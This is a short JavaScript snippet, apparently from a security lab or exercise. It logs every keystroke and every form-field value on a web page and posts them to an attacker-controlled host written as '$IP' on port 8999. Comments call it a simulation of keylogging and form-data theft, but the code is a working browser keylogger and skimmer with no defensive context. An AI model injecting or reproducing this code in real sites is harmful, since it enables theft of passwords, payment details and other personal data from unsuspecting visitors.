document.addEventListener('keyup', (e) => {
  // Simulate keylogging by sending to server
  fetch('https://$IP:8999/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ type: 'key', key: e.key })
  }).catch(err => console.error('Error sending key:', err));
});

// Simulate stealing form data by sending to server
document.querySelectorAll('input').forEach(input => {
  input.addEventListener('change', () => {
    fetch('https://$IP:8999/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ type: 'form', field: input.name, value: input.value })
    }).catch(err => console.error('Error sending form data:', err));
  });
});
